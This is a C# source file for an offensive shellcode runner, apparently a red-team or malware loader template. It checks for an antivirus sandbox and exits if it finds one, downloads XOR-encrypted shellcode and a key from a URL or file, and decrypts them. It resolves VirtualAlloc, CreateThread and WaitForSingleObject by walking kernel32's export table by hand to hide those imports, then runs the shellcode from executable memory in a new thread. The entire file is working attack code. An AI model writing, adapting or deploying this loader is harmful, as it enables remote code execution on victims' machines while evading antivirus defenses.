using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using AVEvasion;

namespace OneShotXorEncShellcodeRunner
{
    public class Program
    {
        // Needed structs for 'kernel32.dll' module parsing
        [Flags]
        public enum MagicType : ushort
        {
            IMAGE_NT_OPTIONAL_HDR32_MAGIC = 0x10b,
            IMAGE_NT_OPTIONAL_HDR64_MAGIC = 0x20b
        }
        [Flags]
        public enum SubSystemType : ushort
        {
            IMAGE_SUBSYSTEM_UNKNOWN = 0,
            IMAGE_SUBSYSTEM_NATIVE = 1,
            IMAGE_SUBSYSTEM_WINDOWS_GUI = 2,
            IMAGE_SUBSYSTEM_WINDOWS_CUI = 3,
            IMAGE_SUBSYSTEM_POSIX_CUI = 7,
            IMAGE_SUBSYSTEM_WINDOWS_CE_GUI = 9,
            IMAGE_SUBSYSTEM_EFI_APPLICATION = 10,
            IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER = 11,
            IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER = 12,
            IMAGE_SUBSYSTEM_EFI_ROM = 13,
            IMAGE_SUBSYSTEM_XBOX = 14

        }
        [Flags]
        public enum DllCharacteristicsType : ushort
        {
            RES_0 = 0x0001,
            RES_1 = 0x0002,
            RES_2 = 0x0004,
            RES_3 = 0x0008,
            IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE = 0x0040,
            IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY = 0x0080,
            IMAGE_DLL_CHARACTERISTICS_NX_COMPAT = 0x0100,
            IMAGE_DLLCHARACTERISTICS_NO_ISOLATION = 0x0200,
            IMAGE_DLLCHARACTERISTICS_NO_SEH = 0x0400,
            IMAGE_DLLCHARACTERISTICS_NO_BIND = 0x0800,
            RES_4 = 0x1000,
            IMAGE_DLLCHARACTERISTICS_WDM_DRIVER = 0x2000,
            IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE = 0x8000
        }

        // Necessary Structs
        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_DATA_DIRECTORY
        {
            public UInt32 VirtualAddress;
            public UInt32 Size;
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_EXPORT_DIRECTORY
        {
            public UInt32 Characteristics;
            public UInt32 TimeDateStamp;
            public UInt16 MajorVersion;
            public UInt16 MinorVersion;
            public UInt32 Name;
            public UInt32 Base;
            public UInt32 NumberOfFunctions;
            public UInt32 NumberOfNames;
            public UInt32 AddressOfFunctions;     // RVA from base of image
            public UInt32 AddressOfNames;     // RVA from base of image
            public UInt32 AddressOfNameOrdinals;  // RVA from base of image
        }
        [StructLayout(LayoutKind.Explicit)]
        public struct IMAGE_OPTIONAL_HEADER32
        {
            [FieldOffset(0)]
            public MagicType Magic;

            [FieldOffset(2)]
            public byte MajorLinkerVersion;

            [FieldOffset(3)]
            public byte MinorLinkerVersion;

            [FieldOffset(4)]
            public uint SizeOfCode;

            [FieldOffset(8)]
            public uint SizeOfInitializedData;

            [FieldOffset(12)]
            public uint SizeOfUninitializedData;

            [FieldOffset(16)]
            public uint AddressOfEntryPoint;

            [FieldOffset(20)]
            public uint BaseOfCode;

            // PE32 contains this additional field
            [FieldOffset(24)]
            public uint BaseOfData;

            [FieldOffset(28)]
            public uint ImageBase;

            [FieldOffset(32)]
            public uint SectionAlignment;

            [FieldOffset(36)]
            public uint FileAlignment;

            [FieldOffset(40)]
            public ushort MajorOperatingSystemVersion;

            [FieldOffset(42)]
            public ushort MinorOperatingSystemVersion;

            [FieldOffset(44)]
            public ushort MajorImageVersion;

            [FieldOffset(46)]
            public ushort MinorImageVersion;

            [FieldOffset(48)]
            public ushort MajorSubsystemVersion;

            [FieldOffset(50)]
            public ushort MinorSubsystemVersion;

            [FieldOffset(52)]
            public uint Win32VersionValue;

            [FieldOffset(56)]
            public uint SizeOfImage;

            [FieldOffset(60)]
            public uint SizeOfHeaders;

            [FieldOffset(64)]
            public uint CheckSum;

            [FieldOffset(68)]
            public SubSystemType Subsystem;

            [FieldOffset(70)]
            public DllCharacteristicsType DllCharacteristics;

            [FieldOffset(72)]
            public uint SizeOfStackReserve;

            [FieldOffset(76)]
            public uint SizeOfStackCommit;

            [FieldOffset(80)]
            public uint SizeOfHeapReserve;

            [FieldOffset(84)]
            public uint SizeOfHeapCommit;

            [FieldOffset(88)]
            public uint LoaderFlags;

            [FieldOffset(92)]
            public uint NumberOfRvaAndSizes;

            [FieldOffset(96)]
            public IMAGE_DATA_DIRECTORY ExportTable;

            [FieldOffset(104)]
            public IMAGE_DATA_DIRECTORY ImportTable;

            [FieldOffset(112)]
            public IMAGE_DATA_DIRECTORY ResourceTable;

            [FieldOffset(120)]
            public IMAGE_DATA_DIRECTORY ExceptionTable;

            [FieldOffset(128)]
            public IMAGE_DATA_DIRECTORY CertificateTable;

            [FieldOffset(136)]
            public IMAGE_DATA_DIRECTORY BaseRelocationTable;

            [FieldOffset(144)]
            public IMAGE_DATA_DIRECTORY Debug;

            [FieldOffset(152)]
            public IMAGE_DATA_DIRECTORY Architecture;

            [FieldOffset(160)]
            public IMAGE_DATA_DIRECTORY GlobalPtr;

            [FieldOffset(168)]
            public IMAGE_DATA_DIRECTORY TLSTable;

            [FieldOffset(176)]
            public IMAGE_DATA_DIRECTORY LoadConfigTable;

            [FieldOffset(184)]
            public IMAGE_DATA_DIRECTORY BoundImport;

            [FieldOffset(192)]
            public IMAGE_DATA_DIRECTORY IAT;

            [FieldOffset(200)]
            public IMAGE_DATA_DIRECTORY DelayImportDescriptor;

            [FieldOffset(208)]
            public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;

            [FieldOffset(216)]
            public IMAGE_DATA_DIRECTORY Reserved;
        }
        [StructLayout(LayoutKind.Explicit)]
        public struct IMAGE_OPTIONAL_HEADER64
        {
            [FieldOffset(0)]
            public MagicType Magic;

            [FieldOffset(2)]
            public byte MajorLinkerVersion;

            [FieldOffset(3)]
            public byte MinorLinkerVersion;

            [FieldOffset(4)]
            public uint SizeOfCode;

            [FieldOffset(8)]
            public uint SizeOfInitializedData;

            [FieldOffset(12)]
            public uint SizeOfUninitializedData;

            [FieldOffset(16)]
            public uint AddressOfEntryPoint;

            [FieldOffset(20)]
            public uint BaseOfCode;

            [FieldOffset(24)]
            public ulong ImageBase;

            [FieldOffset(32)]
            public uint SectionAlignment;

            [FieldOffset(36)]
            public uint FileAlignment;

            [FieldOffset(40)]
            public ushort MajorOperatingSystemVersion;

            [FieldOffset(42)]
            public ushort MinorOperatingSystemVersion;

            [FieldOffset(44)]
            public ushort MajorImageVersion;

            [FieldOffset(46)]
            public ushort MinorImageVersion;

            [FieldOffset(48)]
            public ushort MajorSubsystemVersion;

            [FieldOffset(50)]
            public ushort MinorSubsystemVersion;

            [FieldOffset(52)]
            public uint Win32VersionValue;

            [FieldOffset(56)]
            public uint SizeOfImage;

            [FieldOffset(60)]
            public uint SizeOfHeaders;

            [FieldOffset(64)]
            public uint CheckSum;

            [FieldOffset(68)]
            public SubSystemType Subsystem;

            [FieldOffset(70)]
            public DllCharacteristicsType DllCharacteristics;

            [FieldOffset(72)]
            public ulong SizeOfStackReserve;

            [FieldOffset(80)]
            public ulong SizeOfStackCommit;

            [FieldOffset(88)]
            public ulong SizeOfHeapReserve;

            [FieldOffset(96)]
            public ulong SizeOfHeapCommit;

            [FieldOffset(104)]
            public uint LoaderFlags;

            [FieldOffset(108)]
            public uint NumberOfRvaAndSizes;

            [FieldOffset(112)]
            public IMAGE_DATA_DIRECTORY ExportTable;

            [FieldOffset(120)]
            public IMAGE_DATA_DIRECTORY ImportTable;

            [FieldOffset(128)]
            public IMAGE_DATA_DIRECTORY ResourceTable;

            [FieldOffset(136)]
            public IMAGE_DATA_DIRECTORY ExceptionTable;

            [FieldOffset(144)]
            public IMAGE_DATA_DIRECTORY CertificateTable;

            [FieldOffset(152)]
            public IMAGE_DATA_DIRECTORY BaseRelocationTable;

            [FieldOffset(160)]
            public IMAGE_DATA_DIRECTORY Debug;

            [FieldOffset(168)]
            public IMAGE_DATA_DIRECTORY Architecture;

            [FieldOffset(176)]
            public IMAGE_DATA_DIRECTORY GlobalPtr;

            [FieldOffset(184)]
            public IMAGE_DATA_DIRECTORY TLSTable;

            [FieldOffset(192)]
            public IMAGE_DATA_DIRECTORY LoadConfigTable;

            [FieldOffset(200)]
            public IMAGE_DATA_DIRECTORY BoundImport;

            [FieldOffset(208)]
            public IMAGE_DATA_DIRECTORY IAT;

            [FieldOffset(216)]
            public IMAGE_DATA_DIRECTORY DelayImportDescriptor;

            [FieldOffset(224)]
            public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;

            [FieldOffset(232)]
            public IMAGE_DATA_DIRECTORY Reserved;
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_DOS_HEADER
        {
            public UInt16 e_magic;       // Magic number
            public UInt16 e_cblp;    // Bytes on last page of file
            public UInt16 e_cp;      // Pages in file
            public UInt16 e_crlc;    // Relocations
            public UInt16 e_cparhdr;     // Size of header in paragraphs
            public UInt16 e_minalloc;    // Minimum extra paragraphs needed
            public UInt16 e_maxalloc;    // Maximum extra paragraphs needed
            public UInt16 e_ss;      // Initial (relative) SS value
            public UInt16 e_sp;      // Initial SP value
            public UInt16 e_csum;    // Checksum
            public UInt16 e_ip;      // Initial IP value
            public UInt16 e_cs;      // Initial (relative) CS value
            public UInt16 e_lfarlc;      // File address of relocation table
            public UInt16 e_ovno;    // Overlay number
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
            public UInt16[] e_res1;    // Reserved words
            public UInt16 e_oemid;       // OEM identifier (for e_oeminfo)
            public UInt16 e_oeminfo;     // OEM information; e_oemid specific
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
            public UInt16[] e_res2;    // Reserved words
            public Int32 e_lfanew;      // File address of new exe header
        }

        // Needed WinAPi functions' delegate
        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        delegate IntPtr VirtualAllocDelegate(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        delegate IntPtr CreateThreadDelegate(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        delegate UInt32 WaitForSingleObjectDelegate(IntPtr hHandle, UInt32 dwMilliseconds);

        // Find Kernel32 base
        private static IntPtr FindKernel32()
        {
            foreach (ProcessModule Module in Process.GetCurrentProcess().Modules)
            {
                if (Module.ModuleName.ToLower().Equals("kernel32.dll"))
                {
                    return Module.BaseAddress;
                }
            }
            return IntPtr.Zero;
        }

        // Get function addresses
        private static Boolean GetFunctionAddreses(ref IntPtr VirtualAllocAddr, ref IntPtr CreateThreadAddr, ref IntPtr WaitForSingleObjectAddr)
        {
            // Get 'Kernel32.dll' image base address
            IntPtr Kernel32BaseAddr = FindKernel32();
            IMAGE_DOS_HEADER ImageDosHeader = (IMAGE_DOS_HEADER)Marshal.PtrToStructure(Kernel32BaseAddr, typeof(IMAGE_DOS_HEADER));
            MagicType Architecture = (MagicType)Marshal.ReadInt32((IntPtr)(Kernel32BaseAddr.ToInt64() + ImageDosHeader.e_lfanew + 4 + 20));
            IMAGE_EXPORT_DIRECTORY ImageExportDirectory;
            switch (Architecture)
            {
                case MagicType.IMAGE_NT_OPTIONAL_HDR32_MAGIC:
                    IMAGE_OPTIONAL_HEADER32 PEHeader32 = (IMAGE_OPTIONAL_HEADER32)Marshal.PtrToStructure((IntPtr)(Kernel32BaseAddr.ToInt64() + ImageDosHeader.e_lfanew + 4 + 20), typeof(IMAGE_OPTIONAL_HEADER32));
                    ImageExportDirectory = (IMAGE_EXPORT_DIRECTORY)Marshal.PtrToStructure((IntPtr)(Kernel32BaseAddr.ToInt64() + (int)PEHeader32.ExportTable.VirtualAddress), typeof(IMAGE_EXPORT_DIRECTORY));
                    break;
                case MagicType.IMAGE_NT_OPTIONAL_HDR64_MAGIC:
                    IMAGE_OPTIONAL_HEADER64 PEHeader64 = (IMAGE_OPTIONAL_HEADER64)Marshal.PtrToStructure((IntPtr)(Kernel32BaseAddr.ToInt64() + ImageDosHeader.e_lfanew + 4 + 20), typeof(IMAGE_OPTIONAL_HEADER64));
                    ImageExportDirectory = (IMAGE_EXPORT_DIRECTORY)Marshal.PtrToStructure((IntPtr)(Kernel32BaseAddr.ToInt64() + (int)PEHeader64.ExportTable.VirtualAddress), typeof(IMAGE_EXPORT_DIRECTORY));
                    break;
                default:
                    Console.WriteLine("Failed to identify 'kernel32.dll' architecture");
                    return false;
            };

            // Setup variables for iterating over export table
            int CurrentFunctionNameAddr;
            String CurrentFunctionName;

            // Iterate over export table
            for (int i = 0; i < ImageExportDirectory.NumberOfNames; i++)
            {
                // Get current function's address (pointer) and name (pointer)
                CurrentFunctionNameAddr = Marshal.ReadInt32((IntPtr)(Kernel32BaseAddr.ToInt64() + (int)ImageExportDirectory.AddressOfNames + (i * 4)));
                CurrentFunctionName = Marshal.PtrToStringAnsi((IntPtr)(Kernel32BaseAddr.ToInt64() + (int)CurrentFunctionNameAddr));

                // Check to see if it is the required function
                if (CurrentFunctionName.Equals("VirtualAlloc"))
                {
                    VirtualAllocAddr = (IntPtr)(Kernel32BaseAddr.ToInt64() + Marshal.ReadInt32((IntPtr)(Kernel32BaseAddr.ToInt64() + (int)ImageExportDirectory.AddressOfFunctions + (i * 4))));
                }
                else if (CurrentFunctionName.Equals("CreateThread"))
                {
                    CreateThreadAddr = (IntPtr)(Kernel32BaseAddr.ToInt64() + Marshal.ReadInt32((IntPtr)(Kernel32BaseAddr.ToInt64() + (int)ImageExportDirectory.AddressOfFunctions + (i * 4))));
                }
                else if (CurrentFunctionName.Equals("WaitForSingleObject"))
                {
                    WaitForSingleObjectAddr = (IntPtr)(Kernel32BaseAddr.ToInt64() + Marshal.ReadInt32((IntPtr)(Kernel32BaseAddr.ToInt64() + (int)ImageExportDirectory.AddressOfFunctions + (i * 4))));
                }

                // Return if all functions have been found
                if ((VirtualAllocAddr != IntPtr.Zero) && (CreateThreadAddr != IntPtr.Zero) && (WaitForSingleObjectAddr != IntPtr.Zero))
                {
                    return true;
                }
            }
            return false;
        }

        // GetLastError wrapper
        private static int GetLastError()
        {
            return Marshal.GetLastWin32Error();
        }

        // Main
        public static void Main()
        {
            // Inputs for usage
            Boolean RunAVEvasion = true; // Set to false to skip it
            string KeySource = ""; // http(s) url OR plaintext OR file location
            uint TimeToWait = 0xFFFFFFFF; // Time to wait for the new thread of xor-decrypt key
            string ShellcodeSource = ""; // http(s) url OR file location, leave blank to use shellcode from array           
            byte[] ShellcodeEncrypted = {}; // Xor-encrypted shellcode array to use


            /////////////////////////////////////////////
            // DON't MODIFY BELOW THINGS FOR EVERYDAY USE
            /////////////////////////////////////////////

            // Check if running in AV Sandbox
            if (RunAVEvasion)
            {
                Console.WriteLine("Checking if running in an AV sandbox...");
                if (Heuristics.IsRunningInAVSandbox())
                {
                    return;
                }
            }

            // Get the encrypted shellcode
            if(ShellcodeEncrypted.Length == 0)
            {
                try
                {
                    if (ShellcodeSource.StartsWith("http://") || (ShellcodeSource.StartsWith("https://")))
                    {
                        Console.Write("Downloading xor-encrypted shellcode: ");
                        WebClient WC = new WebClient();
                        ShellcodeEncrypted = WC.DownloadData(ShellcodeSource);
                        Console.Write("DONE !");
                    }
                    else if (File.Exists(ShellcodeSource))
                    {
                        Console.Write("Reading xor-encrypted shellcode from file: ");
                        ShellcodeEncrypted = File.ReadAllBytes(ShellcodeSource);
                        Console.Write("DONE !");
                    }
                    else
                    {
                        throw new Exception();
                    }
                    Console.WriteLine(string.Format(" ({0} bytes)", ShellcodeEncrypted.Length));
                }
                catch
                {
                    Console.WriteLine("FAILED !");
                    return;
                }
            }

            // Get the decryption key
            byte[] DecryptionKey;
            try
            {
                if (KeySource.StartsWith("http://") || (KeySource.StartsWith("https://")))
                {
                    Console.Write("Fetching decryption key: ");
                    WebClient WC = new WebClient();
                    DecryptionKey = WC.DownloadData(KeySource);
                    Console.Write("DONE !");
                }
                else if (File.Exists(KeySource))
                {
                    Console.Write("Reading decryption key from file: ");
                    DecryptionKey = File.ReadAllBytes(KeySource);
                    Console.Write("DONE !");
                }
                else
                {
                    Console.Write("Reading decryption key from argument: ");
                    DecryptionKey = Encoding.UTF8.GetBytes(KeySource);
                    Console.Write("DONE !");
                }
                Console.WriteLine(string.Format(" ({0} bytes)", DecryptionKey.Length));
            }
            catch
            {
                Console.WriteLine("FAILED !");
                return;
            }

            // Decrypt shellcode
            Console.Write("Decrypting shellcode: ");
            IntPtr BytesWritten = IntPtr.Zero;
            byte[] ShellcodeDecrypted = new byte[ShellcodeEncrypted.Length];

            for (int i = 0; i < ShellcodeDecrypted.Length; i++)
            {
                ShellcodeDecrypted[i] = (byte)(DecryptionKey[i % DecryptionKey.Length] ^ ShellcodeEncrypted[i]);
            }
            Console.WriteLine("DONE");

            // Get necessary WinApi functions
            IntPtr VirtualAllocAddr = IntPtr.Zero, CreateThreadAddr = IntPtr.Zero, WaitForSingleObjectAddr = IntPtr.Zero;
            GetFunctionAddreses(ref VirtualAllocAddr, ref CreateThreadAddr, ref WaitForSingleObjectAddr);
            if ((VirtualAllocAddr == IntPtr.Zero) || (CreateThreadAddr == IntPtr.Zero) || (WaitForSingleObjectAddr == IntPtr.Zero))
            {
                Console.WriteLine("Failed to derive necessary WinApi functions");
                return;
            }
            VirtualAllocDelegate VirtualAlloc = (VirtualAllocDelegate)Marshal.GetDelegateForFunctionPointer(VirtualAllocAddr, typeof(VirtualAllocDelegate));
            CreateThreadDelegate CreateThread = (CreateThreadDelegate)Marshal.GetDelegateForFunctionPointer(CreateThreadAddr, typeof(CreateThreadDelegate));
            WaitForSingleObjectDelegate WaitForSingleObject = (WaitForSingleObjectDelegate)Marshal.GetDelegateForFunctionPointer(WaitForSingleObjectAddr, typeof(WaitForSingleObjectDelegate));

            // Inject shellcode
            try
            {
                Console.Write("Injecting shellcode in current process: ");

                // Allocate memory for shellcode
                IntPtr AllocatedMemoryP = VirtualAlloc(IntPtr.Zero, (uint)ShellcodeDecrypted.Length, 0x1000 | 0x2000, 0x40);
                if (AllocatedMemoryP == IntPtr.Zero)
                {
                    Console.WriteLine(string.Format("Error {0} allocating memory", GetLastError()));
                    return;
                }

                // Copy shellcode to allocated memory
                Marshal.Copy(ShellcodeDecrypted, 0, AllocatedMemoryP, ShellcodeDecrypted.Length);
                Console.WriteLine("DONE!");

                // Start execution of the shellcode
                Console.Write("Running shellcode: ");
                IntPtr NewThreadH = CreateThread(IntPtr.Zero, 0, AllocatedMemoryP, IntPtr.Zero, 0, IntPtr.Zero);
                if (NewThreadH == IntPtr.Zero)
                {
                    Console.WriteLine(string.Format("Error {0} creating new thread", GetLastError()));
                    return;
                }
                Console.WriteLine("DONE");

                // Wait for thread
                if (TimeToWait == 0xFFFFFFFF)
                {
                    Console.WriteLine("Waiting indefinitely for newly spawned thread...");
                }
                else
                {
                    Console.WriteLine(string.Format("Waiting {0} miliseconds for newly spawned thread...", TimeToWait));
                }
                WaitForSingleObject(NewThreadH, TimeToWait);
            }
            catch (Exception exception)
            {
                Console.WriteLine(string.Format("\n\n{0}", exception.Message));
            }
        }
    }
}
